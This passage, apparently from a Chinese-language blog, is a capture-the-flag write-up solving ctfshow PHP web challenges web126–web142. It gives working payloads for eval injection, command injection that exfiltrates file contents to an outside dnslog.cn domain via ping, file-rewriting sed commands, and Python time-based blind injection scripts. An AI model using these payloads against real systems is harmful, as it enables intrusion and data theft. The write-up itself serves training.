下标为0对应着a=1，下标为1对应这fl0g=flag_give_me 那么就可以解决问题了。(这是没有parse_str的时候，parse_str的话，key就分别变为a和fl0g)</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/?$fl0g=flag_give_me;</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">$c=&quot;eval($a[0])&quot;</span><br><span class="line">$a[0]=&quot;$fl0g=flag_give_me;&quot;</span><br><span class="line">$c=&quot;eval($fl0g=flag_give_me;)&quot;</span><br><span class="line">eval($c;)</span><br><span class="line">eval(eval($fl0g=flag_give_me;);)</span><br><span class="line">// 把eval换成assert也行   assert(xxx)  如果xxx是字符串的话，会把它当作php代码来执行  和上面的一样</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert和eval与parse_str不同的是，eval要加上$符号</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171040081.png" alt="image-20221222171040081"></p><p>往数组a传值的话，都会先传到下标0下面</p><p><strong>非预期解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: ?0=var_export($GLOBALS);</span><br><span class="line">post: CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($_REQUEST[0])</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171455203.png" alt="image-20221222171455203"></p><p>这样写也行，与parse_str不同的是有无$.</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171621023.png" alt="image-20221222171621023"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222172706658.png" alt="image-20221222172706658"></p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">https://www.cnblogs.com/luomir/p/5129875.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过这个图片和这个博客，知道了$url = $_SERVER[&#x27;QUERY_STRING&#x27;];的作用</span><br></pre></td></tr></table></figure><p>那么就可以进行判断了，那么就是得$url会等于问号后面的内容，那么我们就可以让$url=ctf<em>show=ilove36d，然后就可以得到flag，但是</em>被过滤了，我们就可以通过非法命名来获得__,</p><p>那么[ + .被过滤了，我们就可以使用空格来代替，那么就可以成功输出flag.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173109121.png" alt="image-20221222173109121"></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173902226.png" alt="image-20221222173902226"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">小知识点： _()是一个函数</span><br><span class="line"></span><br><span class="line">_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</span><br><span class="line"></span><br><span class="line">get_defined_vars()函数</span><br><span class="line"></span><br><span class="line">get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</span><br></pre></td></tr></table></figure><p>本地测试过了，<code>call_user_func</code>（）里面有不是函数的东西，也可以var_dump()输出。那么就只需要管最里面的一层<code>`call_user_func</code>（)`了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222185459392.png" alt="image-20221222185459392"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190711929.png" alt=""></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190719988.png" alt="image-20221222190719988"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认目录/var/www/html  就是先返回上一层目录（html)，然后访问一个不存在的目录，然后接着访问上层目录(www)，然后就访问www目录下的html,然后在访问html目录下的flag.php就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222191026405.png" alt="image-20221222191026405"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222192132660.png" alt="image-20221222192132660"></p><p>直接输入就拿到flag了。</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a>    关于正则的这篇文章全部概括了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.   是匹配任意字符</span><br><span class="line">+   是匹配出现的次数</span><br><span class="line">?   是任意字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个if的意思是ctfshow的前面如果有字符的话，就会被匹配到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二个if的意思是因为stripos返回的是这个字符串第一次出现的位置，返回的是int型，而FALSE是bool型，这里又是强等于，肯定不相等。</span><br></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193417083.png" alt="image-20221222193417083"></p><p>这里有个小漏洞，就是正则匹配的话，字符长度超过100w的话就不会在继续匹配了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193744465.png" alt="image-20221222193744465"></p><p>进行100w次打印，然后加上36Dctfshow</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193825464.png" alt="image-20221222193825464"></p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194056040.png" alt="image-20221222194056040"></p><p>是一个小网站</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194137043.png" alt="image-20221222194137043"></p><p>访问robots.txt得到可以访问/admin的信息</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194619883.png" alt="image-20221222194619883"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里就是考察优先级关系，依次从高到低  非与或 ！&amp; |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后第二个就是先进行与判断为false,然后false与$username进行或运算的到true，然后在令code等于admin，就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222195142976.png" alt="image-20221222195142976"></p><p>这道题学习的点还是很多的。</p><p><strong>解法一</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224838401.png" alt="image-20221222224838401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过传入?F=&#x27;$F &#x27;;touch 1,传入之后访问1，没有返回，所以当前目录不可写</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224847076.png" alt="image-20221222224847076"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1   </span><br><span class="line">//.wxtcke.dnslog.cn   是自己去danslog上获取的二级域名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的意思是会截取`$F`;+这六个字符，但是$F的值并没有变，那么就会截取到eval(`$F`;+)里面，变成eval(``$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1`;+)   由于前面的`$F`;+，无法识别，就会绕过，去执行后面可以执行的代码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl不带有任何参数时，curl 就是发出 GET 请求。</span><br><span class="line">grep指令用于查找内容包含指定的范本样式的文件</span><br><span class="line">这里可以使用dns外带把flag带出来</span><br><span class="line">由于flag.php中内容太多了 需要进行格式化 使用linux的 tr -cd</span><br><span class="line">因为flag是数字加字母的字符串，所以可以用tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;</span><br><span class="line">uuid 格式8-4-4-4-12   就是每隔n个字符之间都会有一个-</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a>  curl命令讲解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换(payload&quot;&quot;里的东西就是符合的，所以不进行转换或者清除)</span><br><span class="line">-d, --delete：删除指令字符</span><br><span class="line">-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br><span class="line">-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="line">--help：显示程序用法信息</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a>  这是出题人自己写的wp，可以去看看，因为我的bp不是专业版，用不了那个功能，所以就演示不了了。</p><p>总结一下  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无回显我们可以用反弹shell 或者curl外带 或者盲注 这里的话反弹没有成功，但是可以外带。</span><br></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222231203109.png" alt="image-20221222231203109"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233123188.png" alt="image-20221222233123188"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233130740.png" alt="image-20221222233130740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">这两行代码的讲解，上面的题有过解释，这里就不多说了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload为什么可以这样写呢，首先就是$_SERVER[&#x27;QUERY_STRING&#x27;]会以url/?=xxx  问号后的那内容用&quot;xx&quot;，存储下来，然后又被parse_str()这个函数分割成数组的形式存储下来，就是key=key1,value=36d</span><br><span class="line">key=key2  value=36d</span><br><span class="line">extract($_POST);  这个是变量覆盖，其他的函数必须以post的形式进行输入，那么由于$_SERVER[&#x27;QUERY_STRING&#x27;]只能在get上输入，所以就得在get上这样写了  _POST[key1]=36d&amp;_POST[key2]=36d  以这种形式替代post输入</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222234906905.png" alt="image-20221222234906905"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.j4ko5o.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里awk &#x27;NR==15&#x27;表示的是读取第几行，这是从前面的flag出现的位置判断出来的。然后其他指令的意思web133有讲</span><br></pre></td></tr></table></figure><p>然后就去通过danslog查看拼接flag就好了。</p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222235502578.png" alt="image-20221222235502578"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223151706052.png" alt="image-20221223151706052"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee  a指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件a。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先：</span><br><span class="line">?c=ls | tee a</span><br><span class="line">然后访问url/a,电脑会自动下载一个名为a的文件，然后查看文件，发现里面只有index.php</span><br><span class="line"></span><br><span class="line">?c=ls / | tee b</span><br><span class="line">发现里面有f149_15_h3r3</span><br><span class="line"></span><br><span class="line">?c=cat /f149_15_h3r3 | tee c</span><br></pre></td></tr></table></figure><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p>这个比较骚，就是把题目都给改了。</p><p><a href="https://blog.csdn.net/weixin_39731083/article/details/82495950">https://blog.csdn.net/weixin_39731083/article/details/82495950</a>  xargs sed命令介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步：ls | xargs sed -i &quot;s/die/echo/&quot;   --&gt;-i是进入文本编辑模式 s是表示替换 这里是把die替换成echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二步： ls | xargs sed -i &quot;s/exec/system/&quot;  /后面加个g的话是全局替换，不加是只替换匹配到的第一个</span><br></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223154219888.png" alt="image-20221223154219888"></p><p>这道题考察了就是如何不new一个参数也能访问类里边的函数。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag  ---&gt;就是  类名::函数名  这是函数得是static的情况下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不是static的情况  ctfshow=call_user_func_array(array(new ctfshow(),&#x27;getFlag&#x27;))  ctfshow()---&gt;是类名   getFlag是函数名。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160407968.png" alt="image-20221223160407968"></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160443873.png" alt="image-20221223160443873"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161022503.png" alt="image-20221223161022503"></p><p>利用这一函数的特性，也是不用：：的一种写法</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161241007.png" alt="image-20221223161241007"></p><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161625931.png" alt="image-20221223161625931"></p><p>和web136一样，但是这题的tee和xargs sed用不了了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以得用命令执行的bash盲注</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223175030609.png" alt="image-20221223175030609"></p><p>拿到根目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f149_15_h3r3</span><br></pre></td></tr></table></figure><p><strong>第一步拿根目录下的flag名字</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;</span>   <span class="comment">#cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line">row=<span class="number">6</span></span><br><span class="line">length=<span class="number">20</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,i,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>第二步，读取flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;   #cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#row=6</span></span><br><span class="line">length=<span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,row):</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223180716378.png" alt="image-20221223180716378"></p><p>把flag复制下来，然后把空格去掉，补上{}就能拿到flag了。</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182022441.png" alt="image-20221223182022441"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是让$code等于0，因为是弱类型比较，所以可以让0==&#x27;ctfshow&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182148022.png" alt="image-20221223182148022"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system   把system换成var_dump也行    exec/usleep也行，应该有很多，可以自己去试试</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223202331719.png" alt="image-20221223202331719"></p><p>这里在本地试了下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1+phpinfo()+1 ---&gt; 是可以执行出来的，所以这道题也可以利用这一特点， </span><br><span class="line">if(preg_match(&#x27;/^\W+$/&#x27;, $v3))  ----&gt;这个是正则的意思是不能含有字母，所以我们就可以通过异或来获取字母了。</span><br><span class="line">/^\W+$/ 作用是匹配非数字字母下划线的字符</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><p>无数字字母绕过正则表达式总结    yu师傅写的</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a>  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205123698.png" alt="image-20221223205123698"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205156267.png" alt="image-20221223205156267"></p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205353234.png" alt="image-20221223205353234"></p><p><img 